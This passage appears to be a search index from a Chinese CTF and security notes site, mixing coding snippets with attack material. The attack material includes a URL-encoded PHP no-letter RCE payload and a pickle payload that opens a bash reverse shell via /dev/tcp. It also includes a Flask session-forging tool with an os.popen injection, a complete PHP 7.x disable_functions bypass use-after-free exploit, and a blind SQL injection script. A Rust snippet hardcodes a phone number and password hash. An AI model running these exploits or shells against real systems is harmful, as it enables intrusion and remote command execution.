%24%5F%3D%27%27%2E%5B%5D%3B%24%5F%3D%24%5F%5B%27%5F%27%5D%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%5F%3D%2B%2B%24%5F%3B%24%5F%2B%2B%3B%24%5F%5F%5F%3D%2B%2B%24%5F%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%2B%2B%3B%24%5F%3D%5F%2E%24%5F%5F%5F%2E%24%5F%5F%2E%24%5F%3B%24%24%5F%5B%5F%5D%28%24%24%5F%5B%5F%5F%5D%29%3B get: _=system\u0026amp;__=cat /f*; RCE篇之无数字字母rce - 学安全的小白 - 博客园 (cnblogs.com)\n"},{"id":34,"href":"/docs/network-security/python/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"pickle反序列化","section":"python","content":"#!/usr/bin/python3.6 import os import pickle from base64 import b64encode User = type(\u0026#39;User\u0026#39;, (object,), { \u0026#39;uname\u0026#39;: \u0026#39;test\u0026#39;, \u0026#39;is_admin\u0026#39;: 1, \u0026#39;__repr__\u0026#39;: lambda o: o.uname, \u0026#39;__reduce__\u0026#39;: lambda o: (os.system,(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/ip/7777 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;,)) }) u = pickle.dumps(User()) print(b64encode(u).decode()) "},{"id":35,"href":"/docs/code/python/","title":"Python","section":"code","content":"清华源\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple model linux中python2和3的pip python{2,3} -m pip install xxx Base64\r#\rimport base64 import string base64.b64decode() #解码 base64.b64encode() #编码 处理变表base64 str1 = \u0026#34;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==\u0026#34; #解码字符串 string1 = \u0026#34;TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; #变换后的码表 string2 = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; print(base64.b64decode(str1.translate(str.maketrans(string1,string2)))) 正则\r#\r取AB中间字符\n(?\u0026lt;=A).*?(?=B) #不包含AB A.*?B #包含AB A.*?(?=B) #包含A不包含B import re re.findall(r\u0026#34;(?\u0026lt;=A).*?(?=B)\u0026#34;,str) n位字符取一次\nre.findall(r\u0026#39;.{2}\u0026#39;,str) requests\r#\rproxies={\u0026#39;https\u0026#39;:\u0026#39;127.0.0.1:8080\u0026#39;,\u0026#39;http\u0026#39;:\u0026#39;127.0.0.1:8080\u0026#39;} 线程池\r#\rfrom concurrent.futures import ThreadPoolExecutor def test(x): pass with ThreadPoolExecutor(max_workers=5) as t: for x in range(10): t.submit(test,x) hash\r#\rimport hashlib m = hashlib.md5() m.update(b\u0026#39;123\u0026#39;) m.hexdigest() hashlib.md5(b\u0026#39;123\u0026#39;).hexdigest() hashlib.new(\u0026#39;md5\u0026#39;, b\u0026#39;123\u0026#39;).hexdigest() 指定md5结尾\nimport hashlib i=0 while 1: i+=1 if hashlib.md5(str(i).encode()).hexdigest()[-6:]==\u0026#39;1cf45b\u0026#39;: print(i) break try\r#\r捕获所有异常\ntry: print(num) except Exception as e: print(\u0026#39;产生错误了\u0026#39;,e) JSON\r#\rimport json json.loads(str) josn.dumps(json) time\r#\rfrom datetime import datetime time=\u0026#39;Tue, 06 Sep 2022 03:26:46 GMT\u0026#39; dd=\u0026#39;r\u0026#39;%a, %d %b %Y %H:%M:%S GMT\u0026#39; print(date.strptime(dd,time)) ouput: 20200906112646 然后在小时上加8 xpath\r#\rfrom lxml import etree e=etree.HTML(res) u=e.xpath(path) execjs\r#\rimport execjs with open(\u0026#39;js1.js\u0026#39;,\u0026#39;r\u0026#39;,encoding=\u0026#39;utf-8\u0026#39;) as fp: js1=fp.read() print(execjs.compile(js1).call(\u0026#39;e\u0026#39;,\u0026#39;cat\u0026#39;)) # e为函数名,cat为传参 Crypto\r#\rAES ECB pkcs7\nfrom Crypto.Cipher import AES import base64 from Crypto.Util.Padding import pad, unpad MODE = AES.MODE_ECB PAD_STYLE = \u0026#39;pkcs7\u0026#39; ENCODING = \u0026#39;UTF-8\u0026#39; key=\u0026#39;l8N2iooyp07M9IWa\u0026#39; def encrypt(plaintext: str, key: str) -\u0026gt; str: key_bytes = key.encode(ENCODING) cipher = AES.new(key_bytes, MODE) plaintext_bytes = plaintext.encode(ENCODING) plaintext_bytes_padded = pad(plaintext_bytes, AES.block_size, PAD_STYLE) ciphertext_bytes = cipher.encrypt(plaintext_bytes_padded) ciphertext_base64_bytes = base64.b64encode(ciphertext_bytes) ciphertext = ciphertext_base64_bytes.decode(ENCODING) return ciphertext def decrypt(ciphertext: str, key: str) -\u0026gt; str: key_bytes = key.encode(ENCODING) decrypter = AES.new(key_bytes, MODE) ciphertext_base64_bytes = ciphertext.encode(ENCODING) ciphertext_bytes = base64.b64decode(ciphertext_base64_bytes) plaintext_bytes_padded = decrypter.decrypt(ciphertext_bytes) plaintext_bytes = unpad(plaintext_bytes_padded, AES.block_size, PAD_STYLE) plaintext = plaintext_bytes.decode(ENCODING) return plaintext from Crypto.Cipher import DES,AES,PKCS1_v1_5 from Crypto.PublicKey import RSA import base64 def add(text,L=16): l=len(text) if l\u0026lt;L: text=text+\u0026#39;\\0\u0026#39;*(L-l) elif l\u0026gt;L: text=text+\u0026#39;\\0\u0026#39;*(L-l%L) return text.encode() def AES_encrypt(clear,key,iv): aes=AES.new(add(key),2,add(iv)) return base64.b64encode(aes.encrypt(add(clear))).decode() def AES_decrypt(cipher,key,iv): aes=AES.new(add(key),2,add(iv)) return aes.decrypt(base64.b64decode(cipher.encode())).decode().replace(\u0026#39;\\0\u0026#39;,\u0026#39;\u0026#39;) def DES_encrypt(clear,key): des=DES.new(add(key,8),DES.MODE_ECB) return base64.b64encode(des.encrypt(add(clear,8))).decode() def RSA_encrypt(clear): # 公钥加密，只能用对应的私钥解密，反之 rsa_key = RSA.import_key(open(\u0026#34;key.pem\u0026#34;).read()) cipher = PKCS1_v1_5.new(rsa_key) return base64.b64encode(cipher.encrypt(clear.encode(\u0026#39;utf-8\u0026#39;))).decode() def RSA_encrypt(): pass print(RSA_encrypt(\u0026#39;3jtdV+uOwJU=\u0026#39;)) RC4\nimport base64 from urllib.parse import quote def rc4_main(key = \u0026#34;init_key\u0026#34;, message = \u0026#34;init_message\u0026#34;): # print(\u0026#34;RC4加密主函数\u0026#34;) s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return crypt def rc4_init_sbox(key): s_box = list(range(256)) # print(\u0026#34;原来的 s 盒：%s\u0026#34; % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(\u0026#34;混乱后的 s 盒：%s\u0026#34;% s_box) return s_box def rc4_excrypt(plain, box): # print(\u0026#34;调用加密程序成功。\u0026#34;) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = \u0026#34;\u0026#34;.join(res) print(\u0026#34;加密后的字符串是：\u0026#34; ,quote(cipher)) return (str(base64.b64encode(cipher.encode(\u0026#39;utf-8\u0026#39;)), \u0026#39;utf-8\u0026#39;)) pyqt打包\r#\rpyinstaller "},{"id":36,"href":"/docs/network-security/python/python-session%E4%BC%AA%E9%80%A0/","title":"python session伪造","section":"python","content":" session伪造\r#\r获取SECRET_KEY，一般存放在环境变量中，可通过evs查看，在靶场中可注意查看robots.txt或者通过注入{{config}}查看\nnoraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder (github.com)\n注意python2和python3生成的是不一样的，win和linux好像也不一样\n在encode时注意包裹要用双引号\n在encode时，要注意是否包含True 或者False 在python要首字母大写，不要写错了\nTure =\u0026gt;True\nFlase =\u0026gt;False\n注意看到key后面的符号有些时候会没有复制到，如！\n__import__(\\\u0026#34;os\\\u0026#34;).popen(\\\u0026#34;cat flag.txt\\\u0026#34;).read() ​\tencode\npython3 flask_session_cookie_manager3.py encode -s \u0026#39;.{y]tR\u0026amp;sp\u0026amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d\u0026#39; -t \u0026#39;{\u0026#34;number\u0026#34;:\u0026#34;326410031505\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;}\u0026#39; decode\npython3 flask_session_cookie_manager3.py decode -c \u0026#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoieWVhciJ9.u96oSxNl0euw-9FpcndeiWMoHfMHx55nfrpF8VcpzA8\u0026#39; -s \u0026#39;you-will-never-guess\u0026#39; 没有key就直接-c,但是修改了再加密回去需要知道key才行\n签名伪造\r#\rfrom flask import Flask from flask.sessions import SecureCookieSessionInterface app = Flask(__name__) app.secret_key = b\u0026#39;fb+wwn!n1yo+9c(9s6!_3o#nqm\u0026amp;\u0026amp;_ej$tez)$_ik36n8d7o6mr#y\u0026#39; session_serializer = SecureCookieSessionInterface().get_signing_serializer(app) @app.route(\u0026#39;/\u0026#39;) def index(): print(session_serializer.dumps(\u0026#34;admin\u0026#34;)) index() PID伪造\r#\r有key，\nmac地址:c2:e8:f4:f8:4f:18\ncat /sys/class/net/eth0/address mac地址路径，cookie伪造：https://github.com/noraj/flask-session-cookie-manager\nsys/class/net/eth0/address import random random.seed(0xc2e8f4f84f18) print(str(random.random()*233)) 得到205.110268101\npython se.py encode -s \u0026#39;205.110268101\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;: b\u0026#39;fuck\u0026#39;}\u0026#34; #!/usr/bin/env python3 \u0026#34;\u0026#34;\u0026#34; Flask Session Cookie Decoder/Encoder \u0026#34;\u0026#34;\u0026#34; __author__ = \u0026#39;Wilson Sumanang, Alexandre ZANNI\u0026#39; # standard imports import sys import zlib from itsdangerous import base64_decode import ast # Abstract Base Classes (PEP 3119) if sys.version_info[0] \u0026lt; 3: # \u0026lt; 3.0 raise Exception(\u0026#39;Must be using at least Python 3\u0026#39;) elif sys.version_info[0] == 3 and sys.version_info[1] \u0026lt; 4: # \u0026gt;= 3.0 \u0026amp;\u0026amp; \u0026lt; 3.4 from abc import ABCMeta, abstractmethod else: # \u0026gt; 3.4 from abc import ABC, abstractmethod # Lib for argument parsing import argparse # external Imports from flask.sessions import SecureCookieSessionInterface class MockApp(object): def __init__(self, secret_key): self.secret_key = secret_key if sys.version_info[0] == 3 and sys.version_info[1] \u0026lt; 4: # \u0026gt;= 3.0 \u0026amp;\u0026amp; \u0026lt; 3.4 class FSCM(metaclass=ABCMeta): def encode(secret_key, session_cookie_structure): \u0026#34;\u0026#34;\u0026#34; Encode a Flask session cookie \u0026#34;\u0026#34;\u0026#34; try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return \u0026#34;[Encoding error] {}\u0026#34;.format(e) raise e def decode(session_cookie_value, secret_key=None): \u0026#34;\u0026#34;\u0026#34; Decode a Flask cookie \u0026#34;\u0026#34;\u0026#34; try: if(secret_key==None): compressed = False payload = session_cookie_value if payload.startswith(\u0026#39;.\u0026#39;): compressed = True payload = payload[1:] data = payload.split(\u0026#34;.\u0026#34;)[0] data = base64_decode(data) if compressed: data = zlib.decompress(data) return data else: app = MockApp(secret_key) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.loads(session_cookie_value) except Exception as e: return \u0026#34;[Decoding error] {}\u0026#34;.format(e) raise e else: # \u0026gt; 3.4 class FSCM(ABC): def encode(secret_key, session_cookie_structure): \u0026#34;\u0026#34;\u0026#34; Encode a Flask session cookie \u0026#34;\u0026#34;\u0026#34; try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return \u0026#34;[Encoding error] {}\u0026#34;.format(e) raise e def decode(session_cookie_value, secret_key=None): \u0026#34;\u0026#34;\u0026#34; Decode a Flask cookie \u0026#34;\u0026#34;\u0026#34; try: if(secret_key==None): compressed = False payload = session_cookie_value if payload.startswith(\u0026#39;.\u0026#39;): compressed = True payload = payload[1:] data = payload.split(\u0026#34;.\u0026#34;)[0] data = base64_decode(data) if compressed: data = zlib.decompress(data) return data else: app = MockApp(secret_key) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.loads(session_cookie_value) except Exception as e: return \u0026#34;[Decoding error] {}\u0026#34;.format(e) raise e if __name__ == \u0026#34;__main__\u0026#34;: # Args are only relevant for __main__ usage ## Description for help parser = argparse.ArgumentParser( description=\u0026#39;Flask Session Cookie Decoder/Encoder\u0026#39;, epilog=\u0026#34;Author : Wilson Sumanang, Alexandre ZANNI\u0026#34;) ## prepare sub commands subparsers = parser.add_subparsers(help=\u0026#39;sub-command help\u0026#39;, dest=\u0026#39;subcommand\u0026#39;) ## create the parser for the encode command parser_encode = subparsers.add_parser(\u0026#39;encode\u0026#39;, help=\u0026#39;encode\u0026#39;) parser_encode.add_argument(\u0026#39;-s\u0026#39;, \u0026#39;--secret-key\u0026#39;, metavar=\u0026#39;\u0026lt;string\u0026gt;\u0026#39;, help=\u0026#39;Secret key\u0026#39;, required=True) parser_encode.add_argument(\u0026#39;-t\u0026#39;, \u0026#39;--cookie-structure\u0026#39;, metavar=\u0026#39;\u0026lt;string\u0026gt;\u0026#39;, help=\u0026#39;Session cookie structure\u0026#39;, required=True) ## create the parser for the decode command parser_decode = subparsers.add_parser(\u0026#39;decode\u0026#39;, help=\u0026#39;decode\u0026#39;) parser_decode.add_argument(\u0026#39;-s\u0026#39;, \u0026#39;--secret-key\u0026#39;, metavar=\u0026#39;\u0026lt;string\u0026gt;\u0026#39;, help=\u0026#39;Secret key\u0026#39;, required=False) parser_decode.add_argument(\u0026#39;-c\u0026#39;, \u0026#39;--cookie-value\u0026#39;, metavar=\u0026#39;\u0026lt;string\u0026gt;\u0026#39;, help=\u0026#39;Session cookie value\u0026#39;, required=True) ## get args args = parser.parse_args() ## find the option chosen if(args.subcommand == \u0026#39;encode\u0026#39;): if(args.secret_key is not None and args.cookie_structure is not None): print(FSCM.encode(args.secret_key, args.cookie_structure)) elif(args.subcommand == \u0026#39;decode\u0026#39;): if(args.secret_key is not None and args.cookie_value is not None): print(FSCM.decode(args.cookie_value,args.secret_key)) elif(args.cookie_value is not None): print(FSCM.decode(args.cookie_value)) "},{"id":37,"href":"/docs/network-security/php/readflag/","title":"readflag","section":"php","content":" \u0026lt;?php # PHP 7.0-7.4 disable_functions bypass PoC (*nix only) # # Bug: https://bugs.php.net/bug.php?id=76047 # debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability. # # This exploit should work on all PHP 7.0-7.4 versions # released as of 30/01/2020. # # Author: https://github.com/mm0r1 pwn(\u0026#34;/readflag\u0026#34;); function pwn($cmd) { global $abc, $helper, $backtrace; class Vuln { public $a; public function __destruct() { global $backtrace; unset($this-\u0026gt;a); $backtrace = (new Exception)-\u0026gt;getTrace(); # ;) if(!isset($backtrace[1][\u0026#39;args\u0026#39;])) { # PHP \u0026gt;= 7.4 $backtrace = debug_backtrace(); } } } class Helper { public $a, $b, $c, $d; } function str2ptr(\u0026amp;$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j \u0026gt;= 0; $j--) { $address \u0026lt;\u0026lt;= 8; $address |= ord($str[$p+$j]); } return $address; } function ptr2str($ptr, $m = 8) { $out = \u0026#34;\u0026#34;; for ($i=0; $i \u0026lt; $m; $i++) { $out .= chr($ptr \u0026amp; 0xff); $ptr \u0026gt;\u0026gt;= 8; } return $out; } function write(\u0026amp;$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i \u0026lt; $n; $i++) { $str[$p + $i] = chr($v \u0026amp; 0xff); $v \u0026gt;\u0026gt;= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-\u0026gt;a); if($s != 8) { $leak %= 2 \u0026lt;\u0026lt; ($s * 8) - 1; } return $leak; } function parse_elf($base) { $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i \u0026lt; $e_phnum; $i++) { $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; } else if($p_type == 1 \u0026amp;\u0026amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec $text_size = $p_memsz; } } if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; } function get_basic_funcs($base, $elf) { list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i \u0026lt; $data_size / 8; $i++) { $leak = leak($data_addr, $i * 8); if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { $deref = leak($leak); # \u0026#39;constant\u0026#39; constant check if($deref != 0x746e6174736e6f63) continue; } else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base \u0026gt; 0 \u0026amp;\u0026amp; $leak - $base \u0026lt; $data_addr - $base) { $deref = leak($leak); # \u0026#39;bin2hex\u0026#39; constant check if($deref != 0x786568326e6962) continue; } else continue; return $data_addr + $i * 8; } } function get_binary_base($binary_leak) { $base = 0; $start = $binary_leak \u0026amp; 0xfffffffffffff000; for($i = 0; $i \u0026lt; 0x1000; $i++) { $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) { # ELF header return $addr; } } } function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) { # system return leak($addr + 8); } $addr += 0x20; } while($f_entry != 0); return false; } function trigger_uaf($arg) { # str_shuffle prevents opcache string interning $arg = str_shuffle(str_repeat(\u0026#39;A\u0026#39;, 79)); $vuln = new Vuln(); $vuln-\u0026gt;a = $arg; } if(stristr(PHP_OS, \u0026#39;WIN\u0026#39;)) { die(\u0026#39;This PoC is for *nix systems only.\u0026#39;); } $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i \u0026lt; $n_alloc; $i++) $contiguous[] = str_shuffle(str_repeat(\u0026#39;A\u0026#39;, 79)); trigger_uaf(\u0026#39;x\u0026#39;); $abc = $backtrace[1][\u0026#39;args\u0026#39;][0]; $helper = new Helper; $helper-\u0026gt;b = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\u0026#34;UAF failed\u0026#34;); } # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) { die(\u0026#34;Couldn\u0026#39;t determine binary base address\u0026#34;); } if(!($elf = parse_elf($base))) { die(\u0026#34;Couldn\u0026#39;t parse ELF header\u0026#34;); } if(!($basic_funcs = get_basic_funcs($base, $elf))) { die(\u0026#34;Couldn\u0026#39;t get basic_functions address\u0026#34;); } if(!($zif_system = get_system($basic_funcs))) { die(\u0026#34;Couldn\u0026#39;t get zif_system address\u0026#34;); } # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i \u0026lt; 0x110; $i += 8) { write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); } # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-\u0026gt;b)($cmd); exit(); } ?\u0026gt; "},{"id":38,"href":"/docs/network-security/php/sql%E6%B3%A8%E5%85%A5/regexp%E7%9B%B2%E6%B3%A8/","title":"regexp盲注","section":"php","content":"regexp盲注\nselect (select username from users regexp 正则表达式) 匹配则返回1，反之不匹配返回0\n^xxx匹配xxx开头的字符\nimport string from urllib import parse import requests url=\u0026#39;http://57255251-75f0-44e7-a06a-8b81f5d2b486.node4.buuoj.cn:81/index.php\u0026#39; strings=\u0026#39;_\u0026#39;+string.ascii_lowercase+string.digits passwd=\u0026#39;\u0026#39; while True: for j in strings: data={ \u0026#39;username\u0026#39;:\u0026#39;\\\\\u0026#39;, \u0026#39;passwd\u0026#39;:\u0026#39;||/**/passwd/**/regexp/**/\u0026#34;^{}\u0026#34;;{}\u0026#39;.format((passwd+j),parse.unquote(\u0026#39;%00\u0026#39;))#parse.unqote是不编码%00的意思 } res=requests.post(url,data=data).text if \u0026#39;welcome\u0026#39; in res: passwd += j print(\u0026#34;\\r\u0026#34; + passwd, end=\u0026#34;\u0026#34;) break "},{"id":39,"href":"/docs/wp/webexercise/ruby_cookie/","title":"ruby_cookie","section":"e .wp","content":"\rruby_cookie\r#\rfrom: buuctf [BSidesCF 2019]Mixer\r#\r看到rack-cookie 找了个文章\nrequire \u0026#34;uri\u0026#34; require \u0026#34;base64\u0026#34; require \u0026#34;pp\u0026#34; encoded_string = \u0026#34;BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTBiNDJlNTgzNjJjOWFjNjU5NzJm%0ANzAwYmMxODczZTlkYzBiY2ZkMGI3NGZlYzE4NjBhNWRmNGY3NTg2NDg4NjkG%0AOwBGSSIMYWVzX2tleQY7AEYiJa5eOeNVt5U3U6b2OYRb%2Bz2Do4Uxpnpqkw5L%0AM%2BRPHR46%0A\u0026#34; decoded_uri = URI.decode_www_form_component(encoded_string) decoded_base64 = Base64.decode64(decoded_uri) puts decoded_base64 begin object = Marshal.load(decoded_base64) pp object rescue ArgumentError =\u0026gt; e puts \u0026#34;ERROR: \u0026#34;+e.to_s end 改改，运行\nruby test.rb 看到\n{I\u0026#34;session_id\u0006:\u0006ETI\u0026#34;E0b42e58362c9ac65972f700bc1873e9dc0bcfd0b74fec1860a5df4f758648869\u0006;FI\u0026#34; aes_key\u0006;F\u0026#34;%�^9�U��7S��9�[�=���1�zj�K3�O\u001d\u001e: {\u0026#34;session_id\u0026#34;=\u0026gt;\u0026#34;0b42e58362c9ac65972f700bc1873e9dc0bcfd0b74fec1860a5df4f758648869\u0026#34;, \u0026#34;aes_key\u0026#34;=\u0026gt;\u0026#34;\\xAE^9\\xE3U\\xB7\\x957S\\xA6\\xF69\\x84[\\xFB=\\x83\\xA3\\x851\\xA6zj\\x93\\x0EK3\\xE4O\\x1D\\x1E:\u0026#34;} aes key考虑一波解密，把密钥base64一下或者hex，试了上面的session_id 解不开\n想到返回包中还有一个user cookie，得到\n{\u0026#34;first_name\u0026#34;:\u0026#34;123\u0026#34;,\u0026#34;last_name\u0026#34;:\u0026#34;123\u0026#34;,\u0026#34;is_admin\u0026#34;:0} 开了，直接该is_admin=1,在加密回hex发包回去\nget flag\n"},{"id":40,"href":"/docs/code/rust/","title":"rust","section":"code","content":"\rString\r#\rfn main() { //String和\u0026amp;str的区别可自行百度 //空字符串 let s=String::new(); //可变字符串 let mut s1=String:from(\u0026#34;123\u0026#34;); //追加字符串 s1.push_str(\u0026#34;456\u0026#34;); //追加字符 s1.push(\u0026#34;1\u0026#34;); } 文件读写\r#\r读文件\r#\ruse std::{fs::File, io::Read}; fn main(){ //使用create如果文件不存在则创建,存在则会覆盖源文件(网上所说是会) //如果使用open,没有也是会报错 let mut file=File::create(\u0026#34;test.txt\u0026#34;).expect(\u0026#34;open error\u0026#34;); let mut s=String::new(); let _ = file.read_to_string(\u0026amp;mut s); print!(\u0026#34;{:#?}\u0026#34;,s); } 写文件\r#\ruse std::io::Write; fn main() { let mut file = std::fs::File::create(\u0026#34;data.txt\u0026#34;).expect(\u0026#34;create failed\u0026#34;); file.write_all(\u0026#34;12345\u0026#34;.as_bytes()).expect(\u0026#34;write failed\u0026#34;); file.write_all(\u0026#34;hello world\u0026#34;.as_bytes()).expect(\u0026#34;write failed\u0026#34;); } 追加数据\r#\ruse std::fs::OpenOptions; use std::io::Write; fn main() { let mut file = OpenOptions::new().append(true).open(\u0026#34;data.txt\u0026#34;).expect(\u0026#34;cannot open file\u0026#34;); file.write_all(\u0026#34;123\u0026#34;.as_bytes()).expect(\u0026#34;write failed\u0026#34;); file.write_all(\u0026#34;456\u0026#34;.as_bytes()).expect(\u0026#34;write failed\u0026#34;); file.write_all(\u0026#34;789\u0026#34;.as_bytes()).expect(\u0026#34;write failed\u0026#34;); } 删除文件\r#\ruse std::fs; fn main() { fs::remove_file(\u0026#34;data.txt\u0026#34;).expect(\u0026#34;could not remove file\u0026#34;); println!(\u0026#34;file is removed\u0026#34;); } 文件是否存在\r#\rfn main（）{ let file_path = Path::new(“path_to_file”); if file_path.exists() { println!(\u0026#34;文件存在\u0026#34;); }else { println!(\u0026#34;文件不存在\u0026#34;); } } json\r#\ruse std::fs::File; use serde_json::Value; fn main(){ //解析io流文件 let f=File::open(\u0026#34;test.txt\u0026#34;).unwrap(); let json:Value=serde_json::from_reader(f).unwrap(); //let json:Value=serde_json::from_str(text).unwrap(); for i in json[\u0026#34;data\u0026#34;].as_array().unwrap(){ println!(\u0026#34;{}\u0026#34;,i[\u0026#34;name\u0026#34;].as_str().unwrap()); } //快速定义 let json_object=json!({\u0026#34;total\u0026#34;:123,\u0026#34;data\u0026#34;:[]); } reqwest\r#\ruse std::{time::{SystemTime, UNIX_EPOCH}}; fn get_time() -\u0026gt; String{ SystemTime::now() .duration_since(UNIX_EPOCH) .unwrap() .as_millis() .to_string() } async fn post() -\u0026gt; Result\u0026lt;String, reqwest::Error\u0026gt;{ let client = reqwest::Client::new(); // let mut headers = HeaderMap::new(); // headers.insert(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;.parse().unwrap()); let time=get_time(); let data=[(\u0026#34;phone\u0026#34;,\u0026#34;17340307464\u0026#34;),(\u0026#34;password\u0026#34;,\u0026#34;d41d8cd98f00b204e9800998ecf8427e\u0026#34;),(\u0026#34;countrycode\u0026#34;,\u0026#34;\u0026#34;),(\u0026#34;rememberLogin\u0026#34;,\u0026#34;true\u0026#34;),(\u0026#34;timerstamp\u0026#34;,\u0026amp;time)]; Ok(client.post(\u0026#34;https://music.163.com/weapi/login/cellphone\u0026#34;).json(\u0026amp;data).send().await?.text().await?) } #[tokio::main] async fn main() { if let Ok(res) = post().await { println!(\u0026#34;{:#?}\u0026#34;, res); } } 集合相关\r#\rfn main() { let a = vec![(2, \u0026#34;aa\u0026#34;), (4, \u0026#34;c\u0026#34;), (3, \u0026#34;cc\u0026#34;)]; let b = vec![(3, \u0026#34;cc\u0026#34;), (5, \u0026#34;ee\u0026#34;), (2, \u0026#34;aa\u0026#34;)]; // 取交集 let intersect = a.iter().filter(|\u0026amp;u| b.contains(u)).collect::\u0026lt;Vec\u0026lt;_\u0026gt;\u0026gt;(); println!(\u0026#34;a 和 b 交集是：{:?}\u0026#34;, intersect); // 取差集 let minusion = a.iter().filter(|\u0026amp;u| !b.contains(u)).collect::\u0026lt;Vec\u0026lt;_\u0026gt;\u0026gt;(); println!(\u0026#34;a 和 b 差集是：{:?}\u0026#34;, minusion); // 取并集 let union = a .iter() .filter(|\u0026amp;u| !b.contains(u)) .chain(\u0026amp;b) .collect::\u0026lt;Vec\u0026lt;_\u0026gt;\u0026gt;(); println!(\u0026#34;a 和 b 并集是：{:?}\u0026#34;, union); // 取补集 let complement = a .iter() .filter(|\u0026amp;u| !b.contains(u)) .chain(b.iter().filter(|\u0026amp;u| !a.contains(u))) .collect::\u0026lt;Vec\u0026lt;_\u0026gt;\u0026gt;(); println!(\u0026#34;a 和 b 补集是：{:?}\u0026#34;, complement); } hashmap\r#\rhashmap 补集\nfn diff_hashmap(map1:\u0026amp;HashMap\u0026lt;String,Music\u0026gt;,map2:\u0026amp;HashMap\u0026lt;String,Music\u0026gt;)-\u0026gt;HashMap\u0026lt;String,Music\u0026gt;{ let mut m=HashMap::new(); for(k,v) in map1{ if !map2.contains_key(k) { m.insert(k.clone(), v.clone()); } } for (k,v) in map2 { if !map1.contains_key(k) { m.insert(k.clone(), v.clone()); } }m } lyric and add_pic\nuse metaflac::Tag; use metaflac::block::PictureType::Media; #[tokio::main] async fn main() -\u0026gt; Result\u0026lt;(), reqwest::Error\u0026gt;{ let 